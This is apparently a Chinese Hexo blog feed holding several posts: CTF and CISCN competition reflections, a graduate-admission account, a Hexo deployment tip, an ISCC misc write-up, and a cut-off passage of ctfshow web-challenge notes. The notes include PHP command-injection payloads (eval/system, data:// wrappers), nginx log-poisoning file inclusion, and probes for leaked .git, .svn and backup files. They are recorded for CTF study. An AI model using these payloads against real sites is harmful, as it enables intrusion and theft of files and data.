title="CTF类"></a>CTF类</h2><p>CTF比赛是<strong>性价比最低</strong>的，投入大量时间但是难以拿奖，甚至很多CTF师傅学了几年CTF到头来拿到最高的奖项是PYCC。但是CTF比较酷，能体验到什么是<strong>真正的黑客</strong>，这也是我分流时选网安的原因，更多的CTF师傅是一种热爱，真要说出路找工作远不如ACM和AI。</p><p>我的CTF之路是从B站刷到<strong>ctfshow</strong>的视频开始的，看了B站的视频觉得挺厉害的就买了大师傅h1xa的课，天呐他真的太强了，跟着学完了WEB感觉收获很大，由于自己脑洞比较大所以对MISC也挺感兴趣的，在打比赛的WEB做不出来的时候就去看看MISC，后来和学长做了代码混淆的项目，对二进制方向有些了解，后来朋友带着我入门了漏洞挖掘。</p><p>之前20年前网安很吃香懂个kali就能进大厂，现在已经过了风头随之而来带来的收益也在减少，去年的苕皮事件直接把hvv狠狠砍了一波，今年一天初级最高就500，去年都1500了。</p><p>对于CTF转科研的话主要是以下几个方向：</p><p>对于<strong>PWN</strong>和<strong>RE</strong>方向的师傅之后科研科研走移动安全的漏洞挖掘（fdu有做这个）、摘要生成、函数名恢复等工作（ustc有做这个），现在利用大模型辅助这方面的安全工作是科研的热点。<br>对于<strong>WEB</strong>方向的师傅可以走WEB端的漏洞挖掘，比如PHP中的漏洞链挖掘（zju有做这个），WEB端的挖掘可以衍生在很多的场景下，比如JS引擎（tju有做这个）、数据库漏洞的挖掘（thu有做这个）。<br>对于<strong>MISC</strong>方向的可以做图像相关的工作，这就涉及到CV做的人太多了，做<strong>密码</strong>的也可以对口地找到做密码的老师（sjtu\thu）。<br>总的来说，CTF转科研是有很多路可以走的，本人就是前两年学比赛，后一年搞科研。<br><img src="/img/ISCC%E6%95%B0%E6%8D%AE%E6%80%9D%E7%BB%B4%E8%B5%9B.jpg" alt="图片" title="数据思维赛"><br><img src="/img/ISCC%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B.jpg" alt="图片" title="个人挑战赛"></p><h2 id="项目类"><a href="#项目类" class="headerlink" title="项目类"></a>项目类</h2><p>项目类的比赛是<strong>最有用的</strong>，老师在面试的时候会着重问这方面的内容，如果做的项目有质量而且和老师方向匹配的话那么大概率能够被老师看上。</p><p>对于大多数的人来说能够参加的就是互联网+、大创等等项目类的比赛，这种一般都是远古祖传项目，从上面流下来每一届都负责改一改文案，实际的内容基本不怎么动。这种东西<strong>不是自己做的没什么用</strong>。</p><p>在大一的时候算综测我看好多人都有互联网+、大创什么的，当时觉得可牛逼了，后来才知道有多没用，那种拥有很多个项目的人基本都是社交好相互之间挂名，真论自己的东西实际上什么都没有，面试的时候也千万别拿着祖传项目往简历上写，一问代码你就老实了。</p><p>真正有用的是自己去做的项目从而参加各种作品赛比如有C4、CISCN等等</p><p>具体做项目的过程：</p><ol><li>没有基础的话先去顶会找别人的论文进行解读复现，随后自己进行改进包装。</li><li>有基础的就把自己的idea实现与领域的sota进行对比，有点类似发了篇中文论文。</li></ol><p>其中就涉及到数据集的收集对比、数据的处理、模型的改进、性能的对比等等环节这些就需要自己进行积累学习。</p><h3 id="CISCN作品赛"><a href="#CISCN作品赛" class="headerlink" title="CISCN作品赛"></a>CISCN作品赛</h3><p>水比赛不记录了之前一堆的互联网+和大创也就外行看着感觉厉害一点，记录一下今年刚拿的CISCN国奖，这个含金量应该是所有作品赛里面最高的了。</p><p>这是今年作品赛的时间安排:<br><img src="/img/ciscn1.png" alt="图片" title="时间安排"><br>6.5之前提交作品即可，静待一个月后会公布决赛名单，当时实践赛名单先出我以为是作品赛看到没进国赛直接把官方队长群退了，后来发现是看错了。</p><p>今年的是在西工大，本以为能去西安玩一趟，结果在太仓校区举办，顺道游了一圈苏州园林（看我pyq</p><p>做了个后门攻击的项目，由于比赛不接受攻击课题，强行包装成了后门的漏洞挖掘，也是挺牵强的，因为我们并没有提出防御的措施，仅仅对不同的恶意软件检测模型进行了攻击。</p><p>CISCN决赛的获奖率是100%，再不济都有个优胜奖（相当于没有），我们想的是冲冲国二，因为做的确实挺好的了，无论是演示视频还是文档的编写，我的队友都反复琢磨了几遍。</p><p>甚至最后决赛线下答辩的时候都和老师有说有笑的，老师还在结束的时候说挺好的，结果就给了个三等奖😵。这个比赛如果拿了国一国二是会在当天晚上收到官方的短信的，要求第二天早些到会场进行彩排，如果是三等和优胜奖的话就不会进行信息通知，当晚我们没收到通知特别慌，感觉要寄了，最后幸好是拿到了三等奖（不拿奖都不好意思报销</p><p>我感觉这个比赛虽然难度大含金量高但是还不够公开透明，应该把每个组的分数给公开，不然难免让人怀疑存在人情世故。</p><p>看到了有把github上的区块链项目直接搬来参加的甚至还进了决赛，正好我做过这个项目用fabric，他的前端甚至都和我一样🤣，另外有两个组的前端几乎相同只是换了个颜色，组委会还把两个组的海报放在一起，真的太好笑了。<br><img src="/img/ciscn2.jpg" alt="图片" title="近乎一样的前端，就地球换了个色🌏"></p><p>最后也是拿奖咯<br><img src="/img/CISCN%E4%BD%9C%E5%93%81%E8%B5%9B.jpg" alt="图片" title="CISCN作品赛"></p>]]></content>
    
    
    <categories>
      
      <category>保研</category>
      
      <category>相关竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>数学竞赛</tag>
      
      <tag>数学建模</tag>
      
      <tag>CCF-CSP</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研之路</title>
    <link href="/%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/"/>
    <url>/%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在末2海投就完事了，因为可能哪个都进不去</strong>，今年保研难度特别大，如果不是rk1或者有connection很难过华五及以上的初筛（甚至中九都过不了）</p><p>本文中所提到的老师和组都是本人接触过后感觉不错的所以没有特意打码，大家都可以去报考也算是给各个老师引流了~</p><p>首先要知道一些保研过程中的简称（借鉴<a href="https://www.zhihu.com/question/537883625/answer/3239074860">知乎</a><img src="/img/%E4%BF%9D%E7%A0%940.png" alt="图片" title="保研过程中的部分简称"></p><h2 id="一、个人背景"><a href="#一、个人背景" class="headerlink" title="一、个人背景"></a>一、个人背景</h2><p>学校：终极末流211 ynu（个人感觉超级末</p><p>rank：综测（2&#x2F;100+） 绩点（3&#x2F;100+） 皆为前两年排名<br>因为本人夏令营上岸，除了报了一下thu没有参加其他学校的预推免，最后一年综测也没加活动分了</p><p>英语：四级 474， 六级 439（8.23才出，夏令营没用到）<br>英语烂，被老师质问过，雅思氪金考了一波用来夏令营报名还是发挥了一定的作用</p><p>获奖：奖项较多，可以去看单独的帖子已经都汇总好了，数学&#x2F;算法&#x2F;CTF&#x2F;项目类都有</p><p>科研：和本校老师有三段科研经历无产出，事实证明大部分联系的老师都对和自己相关的科研经历感兴趣</p><p>自己联系到的：华科电信院的<a href="https://hust.teacher.360eol.com/teacherBasic/preview?teacherType=&teacherId=15954">安全组</a>、中科大<a href="http://staff.ustc.edu.cn/~zhangwm/">zwm组</a>、浙大<a href="https://songli.io/#About">小导</a><br>老师可帮我推的：北大rw（暂时不选导师）、上交<a href="https://apex.sjtu.edu.cn/">apex组</a></p><p>最终去向：<a href="http://staff.ustc.edu.cn/~zhangwm/">中科大</a><br><img src="/img/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9E%9C.png" alt="图片" title="我的科大"></p><h2 id="二、保研意向"><a href="#二、保研意向" class="headerlink" title="二、保研意向"></a>二、保研意向</h2><p>对于我来说我想有一些自己的影响力希望能出一些学术成果，所以我比较看重学术水平不是单纯的title战士，之后还可以申请更高一级的博士，毕竟读研也并不是最终归宿~</p><p>报名类型：学硕（本人不太想就业也不想直接读博，想保留一下之后出国留学的可能，所以学硕毋庸置疑是最好的选择）</p><p>意向课题组：尽量选择大组、科研氛围浓厚、老师学术水平强、希望有个大老板有资源（已经狠狠感受到了资源带来的作用</p><p>科研方向：一定要与安全相关，可以是AI安全或者传统安全，不太能接受纯别的方向 </p><p>重要程度：导师&gt;&gt;title&gt;地域。</p><p>因为本科学校实行导师制，每个学生都有自己的导师，在这期间我很能感受到导师对于学生的重要性，地域因素基本不考虑，没有固定想要发展的城市之后也有出国的打算。</p><p>每个导师都会有属于自己的资源，比如可以之后给你推荐工作，发论文的时候对你多多指导和联系，去别的学校深造的时候给你强推荐等等，导师是十分重要的，愿意尽己之力帮助学生的导师才是最好的，这里就特别感谢我本科期间遇到的一些老师，各种超强connection对我帮助特别大，真心感谢。</p><p>总的来说保研的最终目的就是为了选择个去处<strong>能获得更多的资源</strong>，其中包括学校的title、组内的资源、老板的地位等等因素需要考虑。</p><p>首先要知道学校的排名，借鉴一下<a href="https://www.zhihu.com/question/19825429/answer/2680933336">知乎</a>：<br>……………………………………………………………………………………………………………………………………………………………………………………………<br>T1:清华叉院、清华计算机、北大计算机、北大智能</p><p>T2:清华软院、清华深圳、北大深圳、北大软微、浙大计算机、上交计算机、南大人工智能、中科大计算机、南大计算机、人大高瓴、复旦计算机、中科院两所</p><p>T3:北航计算机、哈工深计算机、中科院软件所、人大计算机、浙大软院、南大软院、中科大软院、复旦软院、中科大先研院、国科大深先院</p><p>T4:浙大工院、复旦工研院、中科大科学岛、北航软院、华科、同济、哈工本部</p><p>T5:中科院信工所、国科大杭高院、成电、北邮、北理、武大、西交、东南、南开、中大、天大、华师、厦大、华工、西工、哈工威、南科、上科</p><p>T6:西电、中南、大工、川大、山大、吉大、重大、东北、湖大、北交</p><p>T7:中农、兰大、中海洋、南航、南理、北科、北工、华理、上大、苏大、河海、武理、哈工程、合工、西南交、暨大、深大</p><p>PS：很多学校的网安都是包含在计算机里的，比如清华网研院等于cs、上交电院（计算机）包括网安、浙大网安隶属于计算机学院等等。<br>……………………………………………………………………………………………………………………………………………………………………………………………</p><p>对自己要有个清晰了定位，我可以接受T3的强组orT2弱组（可以发不出论文但不能坑学生），T1太难了带着ynu的title我实在是不敢想</p><p>首先我有个原则就是<strong>套不到导师就不报这个学校</strong>，导师好不好真的太重要了😀，我必须要确保我导师人品好才敢去读（绝不当苦力打黑工</p><p>所以本人的路线：先拿T4保底，再去套磁T3\T2的老师，很幸运，五月份就套上了华科面试聊的都挺顺利，算是拿到了华科的保底，整个保研的过程特别顺利，除了前期焦虑了一下下。</p><p>初期的我是纯title战士，特别想去tpu，在看了tpu官网的<strong>所有</strong>的做计算机的老师之后，本人甚至去投了清深的xx组，现在看来特别荒唐，清北深做安全的都是神兽，希望在这里能救一个是一个，后来收到了北大的入营有点对北大祛魅了。</p><p>关键的转折点是<strong>老师给学校推荐我</strong>，对我帮助很大，在经历了艰难地选择offer之后最后选择了ustc的强组，如果想要了解清北华五的计算机可以问我基本每个学校的老师都套磁过。</p><h2 id="三、各个院校"><a href="#三、各个院校" class="headerlink" title="三、各个院校"></a>三、各个院校</h2><p>接下来以<strong>时间</strong>为线索细说一下本人有过接触院校</p><h3 id="华科"><a href="#华科" class="headerlink" title="华科"></a>华科</h3><p>学长跟我说起了华科电信学院有个做安全的组让我套套，因为是在电信学院估计很容易进因为没有在网安学院，结果真一套一个准，于是我在5月20号的时候套了我的第一个老师：<br><img src="/img/%E4%BF%9D%E7%A0%942.png" alt="图片" title="第一个套的老师，非常顺利"><br>华科有独立的网安学院和武大网安一起建设叫做ncc，所有电信院的这个组基本就没什么人报，和老师套磁后直接就加微信面试了非常的顺利，学长都很和善人都很好，不过华科的夏令营是强com而且保护本校特别严重，所以外校很难入营，后面老师又来发邮件联系我了，但是我已经有了更好的选择所以就果断拒了。<br><img src="/img/%E4%BF%9D%E7%A0%943.png" alt="图片" title="8月底老师又来找我了"><br>这算是我保研的第一个不太靠谱的offer，对我保研前期的心理帮助极大，让我很有信心后面去联系更好学校的老师</p><h3 id="上交"><a href="#上交" class="headerlink" title="上交"></a>上交</h3><p>在保安室看到了上交某ap的招生信息，套了一下上交的ap，非常的热情，甚至回我的邮件比我发出去的字数还多，但是因为本身ynu的title加上不是rk1老师推荐我报联培或者直博，学硕进不去，后面本人报了网安学院的学硕，所以就没有后续啦。</p><p>上交是有两个网安去处的，一个是网络安全研究院，一个是网安学院，虽然研究院招生规模少但是报的人也少，后面我朋友跟我说去报研究院我肯定能进去，早知道就。。。<br><img src="/img/%E4%BF%9D%E7%A0%944.png" alt="图片" title="回的邮件给人感觉人特别好相处"></p><h3 id="浙大"><a href="#浙大" class="headerlink" title="浙大"></a>浙大</h3><p>看了一圈就发现有个刚回国的老师和我较为匹配做web的漏洞挖掘，所以直接就去套了，邮件发出去我还在想措辞合不合理，结果就得到了回复，我愿称之为最速传说<br><img src="/img/%E4%BF%9D%E7%A0%945.png" alt="图片" title="浙大的老师"><br>后来也去浙大参加了夏令营但是由于是直博的夏令营所以也跟老师说了不太想直博的意愿，最终没去。今年报了浙大的朋友跟我说今年浙大软院和计院预推免的bar都超级高，再也不能拿浙软来抄底了。</p><h3 id="南大"><a href="#南大" class="headerlink" title="南大"></a>南大</h3><p>指的是南京大学，不是南昌大学。<br>由于南大是超级强com，虽然联系上了导师但是还是被院系筛了，据我所知我们学校计算机专业没有一个人入南大。</p><h3 id="人大"><a href="#人大" class="headerlink" title="人大"></a>人大</h3><p>在人大看到了一个和我非常match的<a href="https://rucsesec.github.io/">组</a>，人大应该算是第一个遗憾了，因为端午期间去迪拜了，迪拜那边的时间比中国是晚四个小时（我们这里14：00，迪拜10：00）所以导致我错过了人大夏令营的报名（再也不卡ddl了），由于本人有csp成绩能抵满分机试加上已经联系了导师，感觉人大能先拿个offer保底，结果没报上，气昏了，前前后后给组里的大导和小导联系，后面大导让我去找教务，最终也是不了了之了。<br><img src="/img/%E4%BF%9D%E7%A0%946.png" alt="图片" title="先问了下小导"><br><img src="/img/%E4%BF%9D%E7%A0%947.png" alt="图片" title="后面又去找了大导，g"></p><h3 id="北大"><a href="#北大" class="headerlink" title="北大"></a>北大</h3><p>软微直接让我过初筛了，amazing。<br><img src="/img/%E4%BF%9D%E7%A0%948.png" alt="图片" title="难得过初筛了"><br>但是本人没看qq邮箱所以错过了，当时心里咯噔了一下，毕竟这个时候的我还是title战士。</p><p>后来去找老师推荐，老师说可以给我推荐去软微，预推免的时候去那边。但是由于软微的预推免招生都是就业向和我的未来规划不符所以放弃。</p><h2 id="四、闲谈"><a href="#四、闲谈" class="headerlink" title="四、闲谈"></a>四、闲谈</h2><p>投了非常非常多，由于本人的眼高手低导致初期没有任何收获：<br><img src="/img/%E4%BF%9D%E7%A0%941.png" alt="图片" title="部分夏令营投递"><br>这破学校出身实在是太烂了，加上是rk2，几乎与顶尖的院系都无缘，上述过初筛的只有北大软微、科大网安、浙大计院、西交（点击就送</p><p>本人在七月拿到了科大的优营后和老师双选就开摆了，到929填系统已经歇了两个多月了</p><p>所以就也没参加预推免阶段</p><p>一开始只有个华科的offer，没有达到自己的预期，特别的焦虑，把当时所有的夏令营都报完了，结果基本没有什么收获，很多老师跟我聊好了后跟我说，云南大学可能入营有点难。。。</p><p>由于本人的超级e人属性，套磁了非常非常多的老师，基本每个学校都有回应，这里细说一下套过的一些顶级酒吧舞的一些情况</p><p>科大网安的夏令营也变成强com了，感觉和复旦一样只要rk1，但是预推免还是弱com，有些老师会没有完成所有名额的双选，预推免的时候可以积极联系上岸，我浙大夏令营的室友就这样上岸了。</p><p>浙大夏令营的直博竞争压力是很小的，感觉如果想去的话努努力好好干是相对容易的，需要去线下实习，然后做一下老师所定的考核，并不是网上所说的什么打黑工，最多就做个论文汇报，感觉很多人都可以从这里上岸，但是都被网上说的浙大夏令营打黑工骗走了。但是今年浙大的预推免似乎就很难了，我们整个学院除了有关系的就没一个人进了浙计or浙软，隔壁学院有高rk进了浙软，浙计更是逆天bar，之后要想上岸浙大还是从夏令营入手简单一点。</p><p>南大苏州可能相对好上岸一点，我有中2的朋友预推免进了然后候补，但是南大特别硬核，超级强com加上机试和笔试，上岸难度很大。</p><p>复旦只要rk1，跟我没太大的关系，我中上9rk1的朋友去复旦被拷打的很惨，感觉压力给的很大，没有rk就别看🥚了。</p><p>上交有两个网安去处的，一个是网络安全研究院，一个是网安学院，虽然研究院招生规模少但是报的人也少，可以往研究院报，说不定就能入。</p><p>人大的话信息学院（可以用csp抵机试）和智慧治理（在苏州）比较容易，高瓴的话就和thu一个级别了。</p><p>在我看来清北都是弱com，号称唯一强com的学院有connection也可以轻松过初筛，所以要做的就是积极联系导师，这里建议提前去tpu的组里实习，当然人家接受你的前提是你在大二的时候rk高或者有pub。我投过nisl的实习，已读不回了。去年有个hust的朋友去那里实习了大半年对他帮助特别大，甚至有张超的亲笔推荐信orz</p><h2 id="五、最优路线"><a href="#五、最优路线" class="headerlink" title="五、最优路线"></a>五、最优路线</h2><p>如果是大一：卷一年拿到rk1，靠着这个去找个tpu的组实习，实习两年，基本就可以留本组，在末2只有rk1才可能能去实习，因为我拿rk2投了试过。。。<br>如果是大二：rk已经无力回天了，现在你也去不了别的学校找实习，你要做的就是争取高rk的同时进行科研，最好有产出，可以是顶会在投&#x2F;C会都行，有的话就领先同行一大截了，比赛大多都是没什么用的，唯一可能有用的就是算法比赛，但是也远不及科研的作用，当然如果rk高的话就可以直接去top2的组里实习。<br>如果是大三：这是你的rk基本已经定型了，最后一年大家都很卷，基本都是满绩，这时候你要做的就是投入到科研中，然后有pub之后积极的联系导师，争取能找到弱com的学校收你，当然如果rk高的话就可以直接去top2的组里实习。</p><p>在我看来给老师套磁算是一点点合乎规则的走后门，老师说不定能在教务处那捞你一把或者能在面试的时候捞你，我在面试某个地方时，身边的老师问我联系的导师说这是你推荐的学生吧，我老师说嗯是的，然后就什么问题都没问我了，当时我还特别的紧张，真的特别感谢。</p><p>还有就是最重要的一点，还学会利用好身边老师和同学的资源，有时候能起到意想不到的结果。</p>]]></content>
    
    
    <categories>
      
      <category>保研</category>
      
      <category>心路历程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Coding+Github双线部署Hexo</title>
    <link href="/Coding-Github%E5%8F%8C%E7%BA%BF%E9%83%A8%E7%BD%B2Hexo/"/>
    <url>/Coding-Github%E5%8F%8C%E7%BA%BF%E9%83%A8%E7%BD%B2Hexo/</url>
    
    <content type="html"><![CDATA[<h2 id="Github部署博客"><a href="#Github部署博客" class="headerlink" title="Github部署博客"></a>Github部署博客</h2><p>用GitHub page可以<strong>免费</strong>静态部署博客，非常良心，不过想要流畅查看博客的话需要翻墙。<br>大致流程就是有安装好git，配好ssh的公钥和私钥，创建好仓库和分支，之后就可以hexo d上传本地的资料到博客上，B站上有手把手教学不会的可以去对照着看，这方面的教程网络上太多了不过多赘述。<br>更多资料可以查看官方的文档: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h2 id="Coding部署博客"><a href="#Coding部署博客" class="headerlink" title="Coding部署博客"></a>Coding部署博客</h2><p>Coding作为腾讯出品的低配GitHub在我印象中也具有静态部署的功能，所以就打算双线部署加快一下在国内的访问速度。<br>在我配置的时候发现Coding在两年前关闭了免费的静态部署，需要在腾讯云中开启对象存储，查阅之前的官方文档看到可以静态部署博客：<br><img src="/img/coding1.png" alt="图片" title="支持免费静态部署"><br>现在在coding上只有基于主机的持续部署<br><img src="/img/coding2.png" alt="图片" title="主机部署"><br>后来发现官方已经关闭了这个业务，腾讯云不想我们白嫖<br><img src="/img/coding3.png" alt="图片" title="关闭网站托管"><br>现在需要购买存储桶了，这样也会比服务器便宜很多：<br><a href="https://coding.net/help/docs/ci/practice/cloud-storage.html">官方文档</a></p><h2 id="全局config配置"><a href="#全局config配置" class="headerlink" title="全局config配置"></a>全局config配置</h2><p>在网络上查阅了各种资料发现都不能使用hexo d的时候同时成功更新两个仓库，所以就自己看官方文档尝试了一下这种写法，发现是正确的！<br>要注意的是分支，之前的Github部署博客网络上的教程和现版本不同，之前的默认分支名称是”master”,现在将其更改为”main”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs config">deploy:<br>- type: git<br>  repo:<br>    github: https://github.com/lan041221/lan041221.github.io.git,main<br>    coding: git@e.coding.net:g-knec4969/l1nk/l1nk.git,master<br></code></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>一个做项目时的小tip，现在的Anaconda安装需要接受他发的垃圾邮件才能得到下载地址，直接点进结论中下载地址下载就可以跳过了，<a href="https://www.anaconda.com/download/success">Anaconda下载地址</a> </p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>近期需要参加CISCN的作品赛国赛，台式放宿舍了，笔记本上重新配了一遍环境，在我下载<a href="https://www.anaconda.com/">Anaconda</a>的时候发现他已经偷偷更新了，不能直接地进行下载，需要点来点去的 。<br><img src="/img/Anaconda1.png" alt="图片" title="点击Free Download"><br>在这里的话就需要填写个邮箱去获取Anaconda给你发的“相关资讯、产品、服务”，说白了就是官方需要你<strong>提供个邮箱接受垃圾邮件</strong>,非常恶心，只有点了下面的框中的同意才能给你下载地址。<br><img src="/img/Anaconda2.png" alt="图片" title="填写邮箱获取下载链接"><br>输入完成了之后就会进入到上面提到的下载地址中。<br><img src="/img/Anaconda3.png" alt="图片" title="毫无意义地跳转到下载"><br>下载之后在安装过程中需要特别注意勾选Install for <strong>Just Me</strong>,不能选ALL Users。选了ALL Users的话创建虚拟环境的时候不会在安装Anaconda的目录env文件下创建，而会在C盘中创建 <strong>.conda</strong>的文件然后在里面安装创建的虚拟环境。<br><img src="/img/Anaconda4.png" alt="图片" title="全点Next即可"><br>创建好虚拟环境后，使用 <code>conda env list</code> 查看环境。<br><img src="/img/Anaconda5.png" alt="图片" title="创建虚拟环境后正确的结果"></p>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
      <tag>Github</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC一血记录</title>
    <link href="/ISCC%E4%B8%80%E8%A1%80%E8%AE%B0%E5%BD%95/"/>
    <url>/ISCC%E4%B8%80%E8%A1%80%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于ISCC独有的<strong>传播范围广</strong>的特性，导致有很多题目突然间可能就有很多人顿悟从而导致ISCC被业内所诟病，这个比赛基本也很容易就能拿到国奖，其奖项的含金量也无从定义。但是拿一血的含金量是毋庸置疑的，毕竟是全国第一个做出来，这里记录一下拿一血的过程。</p><h3 id="题目：成语学习"><a href="#题目：成语学习" class="headerlink" title="题目：成语学习"></a>题目：成语学习</h3><p>根据流量分析压缩包得到密码为57pmYyWt，丢进虚拟机解，发现是个压缩包<br><img src="/img/ISCC%E4%B8%80%E8%A1%801.png" alt="图片" title="流量分析得到压缩包"></p><p>查看flag在哪，用下面的语句在当前目录及其子目录中搜索名为 flag.txt 的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find ./* -name flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/ISCC%E4%B8%80%E8%A1%802.png" alt="图片" title="找到flag.txt"><br>查看里面的内容，上面说不要用食物去加密，食物是英语，文档里面题目是《你信我啊》，这个题叫做《成语学习》。联想到<strong>加salt的哈希算法</strong>用食物（salt）去加密他给的成语<br><img src="/img/ISCC%E4%B8%80%E8%A1%803.png" alt="图片" title="找到flag.txt"><br>接下来在<a href="https://www.uutils.com/enc/hmac_sha.htm">加密解密网站</a>中一个一个的试带盐的加密，最终试到是HmacMD5加密算法<br>最终拿到flag:ISCC{86bd2a65ea0d68bf231dd5c0a9c5e8c1}<br><img src="/img/ISCC%E4%B8%80%E8%A1%804.png" alt="图片" title="成功获得该题flag"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>MISC方向的题目通常需要技术常识和工具使用外的<strong>一点灵性脑洞</strong>才能解出题目来。<br>成语学习这个题目也不例外。首先，需要会使用wireshark分析流量拿到密码，然后用命令查找到可能包含flag信息的文件，接着再利用密码基础联想到文本信息的隐藏意思想到其中可能会用到的算法。<br>这是我第一次拿一血，这种快乐是我之前从来没体会过的，有种世界上我最聪明的感觉。</p>]]></content>
    
    
    <categories>
      
      <category>竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web笔记</title>
    <link href="/web%E7%AC%94%E8%AE%B0/"/>
    <url>/web%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我在打ctf的时候在<a href="https://ctf.show/challenges">ctfshow平台</a>学习web方向的记录，建议配合平台中的题目一起查看。<br>依据本人的学习经验web方向需要依靠大量的知识积累，类似于文科的背诵，再加上对新披露的漏洞的知晓，大部分比赛都是直接拿最新CVE来出题。</p><h2 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h2><p>直接查看网页源码，flag可能再被注释掉的内容里面没有显示出来（强制查看：通过在url头部添加 view-source:）web1 web2<br>通过burpsuite抓包 flag在返回的响应数据包里面 web3<br>&#x2F;robots.txt web4<br>phps作为备份文件，泄露了源码（index.phps）web5<br>www源码泄露 web6<br>url&#x2F;.git web7<br>url&#x2F;.svn web8<br>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，如果意外退出，缓存文件保留下来，这时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo，第三次退出后文件名为.index.php.swn web9<br>cookie中也会隐藏数据 web10<br> nslookup -qt&#x3D;txt flag.ctfshow.com 其中有： 非权威应答: flag.ctfshow.com text &#x3D;<br>    “flag{just_seesee}” web11<br>有时候网站上的公开信息，就是管理员常用密码 web12<br>找网站的document，操作指南 web13<br>&#x2F;editor，暴露作者页面直接在url后面添加&#x2F;editor 然后查看flag路径并且访问 web14<br>邮箱会泄露信息 web15<br>php探针url&#x2F;tz.php web16<br>备份的sql文件会泄露敏感信息url&#x2F;backup.sql web17</p><p>—-2023.7.14.  22:25 l1nk</p><h2 id="2-爆破"><a href="#2-爆破" class="headerlink" title="2.爆破"></a>2.爆破</h2><p>爆破的时候，信息可能藏在Authorization中 web21<br>子域名爆破 web22<br>MD5加密 substr()、intval() web23<br>伪随机数 mt_srand()、mt_rand() web24</p><h2 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3.命令执行"></a>3.命令执行</h2><p>嵌套eval逃逸函数绕过过滤<br>url + ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);<br>php的filter伪协议，读取文件内容并输出<br>data伪协议，后面直接加执行的代码<br>套娃函数?c&#x3D;eval(array_pop(next(get_defined_vars())));</p><p>—-2023.7.16  1:25 l1nk</p><p>没有学习，打永劫去了</p><p>—-2023.7.17  0:02 l1nk</p><p>ls，cat是系统命令，需要包含在system（“”）中进行执行</p><p>data伪协议<br>payload：<br>url+?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("cat fla*.php");?><br>可简写为：url+?c&#x3D;data:,<?php system("cat fla*.php");?></p><p>filter伪协议</p><p>system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);写入黑洞文件中，利用 命令一；ls来执行命令一<br>当$(())没有参数时。默认为0，0的取反为-1 web57</p><p>—-2023.7.18  2:23 l1nk</p><p>c&#x3D;$a&#x3D;opendir(“.&#x2F;“); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false){echo $file . “”; };查看当前目录是否有东西<br>$s &#x3D; ob_get_contents();<br>这一句的作用是定义了一个s变量并把ob_get_contents()返回的输出缓冲区的内容赋值给了s<br>ob_end_clean();<br>这个函数的作用是以字符串格式返回当前输出缓冲区并关闭输出缓冲<br>echo preg_replace(“&#x2F;[0-9]|[a-z]&#x2F;i”,”?”,$s);<br>这一句话是把变量s，即缓冲区内容的所有的数字和字母替换成了为?<br>缓冲区的题目需要在正确命令后面执行exit（）；及时退出才能成功执行<br>PDO连数据库</p><p>—-2023.7.18 16:34 l1nk</p><p>字符拼接，学不了一点，先不学（web118-124）</p><p>—-2023.7.19 17:34 l1nk</p><h2 id="4-文件包含"><a href="#4-文件包含" class="headerlink" title="4.文件包含"></a>4.文件包含</h2><p>nginx原理和日志文件包含，在User-Agent里面写php代码，中间件php-fpm会解析，实现恶意代码。<br>默认路径url?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>过滤掉了.的话要用session执行（web82-86）</p><h2 id="5-php"><a href="#5-php" class="headerlink" 